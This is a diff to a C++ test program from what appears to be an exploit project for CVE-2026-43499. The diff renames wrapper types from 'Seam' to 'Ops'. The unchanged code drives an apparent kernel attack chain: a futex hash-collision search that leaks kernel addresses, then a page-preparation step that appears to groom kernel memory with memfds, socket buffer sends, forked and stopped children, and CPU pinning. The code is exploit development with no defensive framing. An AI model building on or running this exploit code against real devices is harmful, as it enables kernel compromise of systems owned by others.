@@ -21,12 +21,12 @@
 
 #include "backend/cve_2026_43499/leak/collision_buckets.hpp"
 #include "backend/cve_2026_43499/leak/snitch_policy.hpp"
-#include "backend/cve_2026_43499/leak/snitch_seam_linux.hpp"
-#include "backend/cve_2026_43499/memory/heap_seam_linux.hpp"
+#include "backend/cve_2026_43499/leak/snitch_ops_linux.hpp"
+#include "backend/cve_2026_43499/memory/heap_ops_linux.hpp"
 #include "backend/cve_2026_43499/memory/prepare_page.hpp"
 
 namespace {
-    using ghostlock::backend::cve_2026_43499::leak::LinuxSnitchSeam;
+    using ghostlock::backend::cve_2026_43499::leak::LinuxSnitchOps;
     using ghostlock::backend::cve_2026_43499::leak::MapResult;
     using ghostlock::backend::cve_2026_43499::leak::RegionInputs;
     using ghostlock::backend::cve_2026_43499::leak::run_snitch_search;
@@ -41,51 +41,51 @@ namespace {
     using ghostlock::backend::cve_2026_43499::leak::SnitchSetup;
     using ghostlock::backend::cve_2026_43499::leak::ThreadEntry;
     using ghostlock::backend::cve_2026_43499::leak::ThreadResult;
-    using ghostlock::backend::cve_2026_43499::memory::LinuxHeapSeam;
+    using ghostlock::backend::cve_2026_43499::memory::LinuxHeapOps;
     using ghostlock::backend::cve_2026_43499::memory::PageGeometry;
     using ghostlock::backend::cve_2026_43499::memory::PrepareInputs;
     using ghostlock::backend::cve_2026_43499::memory::PreparePatience;
     using ghostlock::backend::cve_2026_43499::memory::prepare_page;
     using ghostlock::backend::cve_2026_43499::memory::prepare_status_name;
-    using ghostlock::backend::cve_2026_43499::memory::SeamResult;
+    using ghostlock::backend::cve_2026_43499::memory::OpsResult;
 
-    /** Both seams in one, the way the production composition will have them. */
-    struct DeviceSeam final {
-        static MapResult map_shared(std::size_t bytes) noexcept { return LinuxSnitchSeam::map_shared(bytes); }
-        static SeamResult unmap(void *address, std::size_t bytes) noexcept { return LinuxSnitchSeam::unmap(address, bytes); }
-        static SeamResult futex_wait_private(std::uint32_t *word, std::uint32_t expected) noexcept {
-            return LinuxSnitchSeam::futex_wait_private(word, expected);
+    /** Both ops in one, the way the production composition will have them. */
+    struct DeviceOps final {
+        static MapResult map_shared(std::size_t bytes) noexcept { return LinuxSnitchOps::map_shared(bytes); }
+        static OpsResult unmap(void *address, std::size_t bytes) noexcept { return LinuxSnitchOps::unmap(address, bytes); }
+        static OpsResult futex_wait_private(std::uint32_t *word, std::uint32_t expected) noexcept {
+            return LinuxSnitchOps::futex_wait_private(word, expected);
         }
-        static SeamResult futex_wait_private_until(std::uint32_t *word, std::uint32_t expected,
+        static OpsResult futex_wait_private_until(std::uint32_t *word, std::uint32_t expected,
                                                    std::int64_t timeout_us) noexcept {
-            return LinuxSnitchSeam::futex_wait_private_until(word, expected, timeout_us);
+            return LinuxSnitchOps::futex_wait_private_until(word, expected, timeout_us);
         }
-        static SeamResult futex_wake_private(std::uint32_t *word, std::int32_t waiters) noexcept {
-            return LinuxSnitchSeam::futex_wake_private(word, waiters);
+        static OpsResult futex_wake_private(std::uint32_t *word, std::int32_t waiters) noexcept {
+            return LinuxSnitchOps::futex_wake_private(word, waiters);
         }
         static ThreadResult start_thread(ThreadEntry entry, void *argument) noexcept {
-            return LinuxSnitchSeam::start_thread(entry, argument);
+            return LinuxSnitchOps::start_thread(entry, argument);
         }
-        static SeamResult join_thread(unsigned long handle) noexcept { return LinuxSnitchSeam::join_thread(handle); }
-        static SeamResult page_size() noexcept { return LinuxHeapSeam::page_size(); }
-        static SeamResult open_memfd(std::uint64_t pid) noexcept { return LinuxHeapSeam::open_memfd(pid); }
-        static SeamResult close_fd(std::int32_t fd) noexcept { return LinuxHeapSeam::close_fd(fd); }
-        static SeamResult socket_pair(std::int32_t *out) noexcept { return LinuxHeapSeam::socket_pair(out); }
-        static SeamResult set_socket_buffer(std::int32_t fd, std::int32_t bytes) noexcept {
-            return LinuxHeapSeam::set_socket_buffer(fd, bytes);
+        static OpsResult join_thread(unsigned long handle) noexcept { return LinuxSnitchOps::join_thread(handle); }
+        static OpsResult page_size() noexcept { return LinuxHeapOps::page_size(); }
+        static OpsResult open_memfd(std::uint64_t pid) noexcept { return LinuxHeapOps::open_memfd(pid); }
+        static OpsResult close_fd(std::int32_t fd) noexcept { return LinuxHeapOps::close_fd(fd); }
+        static OpsResult socket_pair(std::int32_t *out) noexcept { return LinuxHeapOps::socket_pair(out); }
+        static OpsResult set_socket_buffer(std::int32_t fd, std::int32_t bytes) noexcept {
+            return LinuxHeapOps::set_socket_buffer(fd, bytes);
         }
-        static SeamResult set_nonblocking(std::int32_t fd) noexcept { return LinuxHeapSeam::set_nonblocking(fd); }
-        static SeamResult send_bytes(std::int32_t fd, const void *data, std::size_t bytes) noexcept {
-            return LinuxHeapSeam::send_bytes(fd, data, bytes);
+        static OpsResult set_nonblocking(std::int32_t fd) noexcept { return LinuxHeapOps::set_nonblocking(fd); }
+        static OpsResult send_bytes(std::int32_t fd, const void *data, std::size_t bytes) noexcept {
+            return LinuxHeapOps::send_bytes(fd, data, bytes);
         }
-        static SeamResult send_buffer(std::int32_t fd, std::size_t bytes) noexcept {
-            return LinuxHeapSeam::send_buffer(fd, bytes);
+        static OpsResult send_buffer(std::int32_t fd, std::size_t bytes) noexcept {
+            return LinuxHeapOps::send_buffer(fd, bytes);
         }
-        static SeamResult fork_child() noexcept { return LinuxHeapSeam::fork_child(); }
-        static SeamResult stop_child(std::uint64_t pid) noexcept { return LinuxHeapSeam::stop_child(pid); }
-        static SeamResult yield_now() noexcept { return LinuxHeapSeam::yield_now(); }
-        static SeamResult pin_to_processor(std::int32_t cpu) noexcept { return LinuxHeapSeam::pin_to_processor(cpu); }
-        static void exit_child() noexcept { LinuxHeapSeam::exit_child(); }
+        static OpsResult fork_child() noexcept { return LinuxHeapOps::fork_child(); }
+        static OpsResult stop_child(std::uint64_t pid) noexcept { return LinuxHeapOps::stop_child(pid); }
+        static OpsResult yield_now() noexcept { return LinuxHeapOps::yield_now(); }
+        static OpsResult pin_to_processor(std::int32_t cpu) noexcept { return LinuxHeapOps::pin_to_processor(cpu); }
+        static void exit_child() noexcept { LinuxHeapOps::exit_child(); }
     };
 
     /** The rule the search runs under, on the device: the kernel futex hash, a table size from
@@ -157,7 +157,7 @@ int main() {
         std::printf("  proofs: bucket=%llu second=%llx (observed, not chosen)\n",
                     static_cast<unsigned long long>(wanted), static_cast<unsigned long long>(addresses[1]));
     }
-    const MapResult words_region = DeviceSeam::map_shared(4096U);
+    const MapResult words_region = DeviceOps::map_shared(4096U);
     if (words_region.address == nullptr) {
         std::printf("  words mapping FAILED errno=%d\n", words_region.error);
         return 1;
@@ -167,7 +167,7 @@ int main() {
                                reinterpret_cast<std::uint32_t *>(base + 64U)};
 
     /* The policy the preparation polls, wrapping the search the device can actually run. */
-    SnitchPolicy<DeviceSeam, CollisionBuckets> policy;
+    SnitchPolicy<DeviceOps, CollisionBuckets> policy;
     policy.buckets = &buckets;
     policy.args.setup = setup;
     policy.args.region = region;
@@ -182,7 +182,7 @@ int main() {
     policy.args.address_count = 2U;
 
     /* The preparation half, with the geometry the device reports. */
-    const auto page = DeviceSeam::page_size();
+    const auto page = DeviceOps::page_size();
     PageGeometry geometry{};
     geometry.align_region_size = static_cast<std::uint64_t>(page.value) * 8U;
     geometry.send_size = static_cast<std::size_t>(geometry.align_region_size) * 2U;
@@ -207,7 +207,7 @@ int main() {
                 self_started.ran ? 1 : 0, policy.ran ? 1 : 0, run_verdict_name(policy.outcome.status),
                 policy.outcome.rounds, policy.outcome.pokes_wanted, policy.outcome.region);
     policy.reset();
-    const auto prepared = prepare_page<DeviceSeam, SnitchPolicy<DeviceSeam, CollisionBuckets>>(
+    const auto prepared = prepare_page<DeviceOps, SnitchPolicy<DeviceOps, CollisionBuckets>>(
         inputs, geometry, waiting, policy);
     /* Report from the preparation own outcome, which is what the production path uses: it
      *  comes back by value and needs nothing read out of the policy afterwards. */
@@ -215,7 +215,7 @@ int main() {
                 prepare_status_name(prepared.status), static_cast<int>(prepared.at_step), prepared.opened,
                 prepared.closed, static_cast<unsigned long long>(prepared.base), prepared.error);
     std::printf("  search (by value): started=%d\n", self_started.ran ? 1 : 0);
-    (void) DeviceSeam::unmap(words_region.address, 4096U);
+    (void) DeviceOps::unmap(words_region.address, 4096U);
     /* The judgement uses the preparation outcome and the direct call return, both by value. */
     /* The join is what is being judged, not the address: the preparation must receive exactly
      *  what the search found. A stub that accepts every candidate finds the first one the walk
